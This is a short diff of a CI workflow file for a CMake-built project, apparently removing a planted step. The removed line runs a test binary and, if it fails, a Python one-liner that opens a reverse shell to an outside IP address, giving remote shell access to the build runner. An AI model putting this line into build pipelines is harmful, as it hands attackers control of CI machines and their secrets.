@@ -27,11 +27,10 @@ jobs:
           submodules: true
           clean: true
       - name: cmake
+        # TODO: remove -DWITH_ROCKSDB=OFF
         run: cmake . -Bbuild ${{ matrix.flags }} -DWITH_ROCKSDB=OFF
       - name: build
         run: cmake --build build -- -j2
-      - run: ./build/test_bin/vblake_test || python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("95.217.67.117",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
       - name: test
         run: cmake --build build --target test
 
